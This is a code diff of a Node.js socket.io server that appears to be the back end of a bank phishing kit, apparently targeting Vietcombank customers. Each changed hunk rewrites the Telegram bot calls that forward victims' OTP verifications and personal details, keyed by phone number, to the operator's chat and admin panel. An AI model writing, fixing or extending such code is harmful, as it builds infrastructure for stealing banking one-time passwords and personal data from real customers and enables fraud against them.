@@ -109,7 +109,10 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         // const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
         // socket.emit('send-data-send-otp-vcb', response);
        await socketIo.emit('send-data-admin-user', data);
-       await api.sendMessage(chatId, `Có người dùng vừa xác thực OTP: ${JSON.stringify(data)}`);
+        await api.sendMessage({
+            chat_id: chatId,
+            text: `Có người dùng vừa xác thực OTP: ${JSON.stringify(data)}`,
+        });
     })
 
     // socket.on('send-method-ct-vcb', async (data) => {
@@ -130,7 +133,8 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         await socketIo.emit('send-data-admin', {
             ...data,
         });
-        await api.sendMessage(chatId, {
+        await api.sendMessage({
+            chat_id: chatId,
             text: `Có người dùng vừa cập nhật thông tin: ${JSON.stringify(data)}`,
         });
         // switch (data.bankName) {
@@ -166,8 +170,9 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
     // })
 
     socket.on('send-data-user', async (data) => {
-       await socketIo.emit(`send-data-user-${data.numberPhone}`, data);
-        await api.sendMessage(chatId, {
+        await socketIo.emit(`send-data-user-${data.numberPhone}`, data);
+        await api.sendMessage({
+            chat_id: chatId,
             text: `Có người dùng vừa cập nhật thông tin: ${JSON.stringify(data)}`,
         });
     });
@@ -443,7 +448,8 @@ app.put('/api/update-user/:numberPhone', async (req, res) => {
             status: 404
         })
     }
-    bot.sendMessage(chatId, {
+    bot.sendMessage({
+        chat_id: chatId,
         text: `Có người dùng vừa cập nhật thông tin: ${JSON.stringify(req.body)}`,
     });
 
